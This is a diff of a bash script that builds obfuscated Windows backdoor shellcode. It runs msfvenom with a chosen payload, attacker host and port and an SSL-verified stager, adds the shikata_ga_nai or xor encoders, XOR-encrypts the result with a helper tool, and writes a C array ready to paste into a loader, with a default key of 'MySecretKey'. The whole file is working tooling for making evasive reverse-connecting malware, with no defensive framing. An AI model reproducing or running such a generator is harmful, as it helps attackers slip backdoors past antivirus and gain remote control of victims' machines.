@@ -84,41 +84,59 @@ if [[ -z "${arch}" || -z "${host}" || -z "${port}" ]]; then
 
     usage
 
-elif [[ ! -x "$(command -v ASCIIexzor)" ]];then 
+elif [[ ! -x "$(command -v textioconv)" ]];then 
 
-    echo -en "\nThis script is meant to be used with ASCIIexzor..."
+    echo -en "\nThis script is meant to be used with textioconv..."
     exit
 
 else 
 
-    shellcodetxt="toPaste.txt"
-    bckdoorcert="/tmp/openssl_cert.pem"
+    src_code="toPaste.txt"
+    bkdoorcrt="/tmp/openssl_cert.pem"
     tmpmsf="/tmp/msf.txt"
-    
+    OS="windows"
+
     [[ -z ${varSRC} ]] && varSRC=encrypted_txt 
-    [[ ! -f ${bckdoorcert} ]] && ssl_cert >/dev/null 2>&1
-    [[ -f ${shellcodetxt} ]] && rm ${shellcodetxt}
+    [[ ! -f ${bkdoorcrt} ]] && ssl_cert >/dev/null 2>&1
+    [[ -f ${src_code} ]] && rm ${src_code}
     [[ -f ${tmpmsf} ]] && rm ${tmpmsf}
-    # msfvenom -p "${payload}" --platform windows -a "${arch}" LHOST="${host}" LPORT="${port}" PayloadUUIDTracking=true PayloadUUIDName=€hllow0rld StagerVerifySSLCert=true HandlerSSLCert="/tmp/openssl_cert.pem" -f c -o /tmp/msf.txt
-    msfvenom -p "${payload}" --platform windows -a "${arch}" -b "\x00" -i 0 LHOST="${host}" LPORT="${port}" StagerVerifySSLCert=true HandlerSSLCert=${bckdoorcert} -f c -o ${tmpmsf}
+
+    if [[ "${arch}" == "x86" ]];then
+
+        eX86="x86/shikata_ga_nai"
+        msfvenom -p "${payload}" --smallest --platform ${OS} -a "${arch}" -e "${eX86}" -b "\x00" -i 0 LHOST="${host}" LPORT="${port}" StagerVerifySSLCert=true HandlerSSLCert=${bkdoorcrt} -f c -o ${tmpmsf}
+
+    else
+
+        eX64="x64/xor"
+        msfvenom -p "${payload}" --smallest --platform ${OS} -a "${arch}" -e "${eX64}" -i 0 LHOST="${host}" LPORT="${port}" StagerVerifySSLCert=true HandlerSSLCert=${bkdoorcrt} -f c -o ${tmpmsf}
+
+    fi
+
     hexShell=$(sed -z 's|unsigned char buf\[\]||;s|[\\x\x0A\x1B\x20\x22\x3B\x3D]||g' ${tmpmsf})
 
     if [[ -n "${XOR_Key}" ]];then
 
-        ASCIIexzor -s "${hexShell}" -x "${XOR_Key}" >/dev/null 2>&1
+        ocShellCode=$(textioconv -s "${hexShell}" -x "${XOR_Key}")
 
     else
 
-        ASCIIexzor -s "${hexShell}" >/dev/null 2>&1
+        ocShellCode=$(textioconv -s "${hexShell}")
 
     fi
 
-    # ASCIIexzor writes the unformatted encrypted backdoor in the .txt file /tmp/txtEncryptedASCII.txt
-    # sed makes it compilable.
+    if [[ -n ${ocShellCode} ]];then 
 
-    encryptedShell=$(sed "s/./'&',/g; s/,$//" /tmp/txtEncryptedASCII.txt | sed 's|\\|\\x5C|g;s|\^|\\x5E|g;s|\x20|\\x20|g;s|\x60|\\x60|g;s|\x7E|\\x7E|g;s|\x7F|\\x7F|g') 
-    echo "unsigned char ${varSRC}[] = {${encryptedShell}};" | dd of=${shellcodetxt} >/dev/null 2>&1
-    echo -en "\nThe shellcode has been written in the txt file ${shellcodetxt}"
-    [[ -n ${XOR_Key} ]] && echo -en "\nThe xor key is : ${XOR_Key}" || echo -en "\nThe xor key is : MySecretKey"
+        sh_size=$(echo ${ocShellCode} | tr ',' ' ' | wc -w)
+        ((sh_size+=1))
+        echo "unsigned char ${varSRC}[${sh_size}] = {${ocShellCode}, 0000};" | dd of=${src_code} >/dev/null 2>&1
+        echo -en "\nThe shellcode has been written in the txt file ${src_code}."
+        [[ -n ${XOR_Key} ]] && echo -en "\nThe xor key is : ${XOR_Key}" || echo -en "\nThe xor key is : MySecretKey"
 
+    else
+
+        echo "the array has been not generated."
+
+    fi
+   
 fi
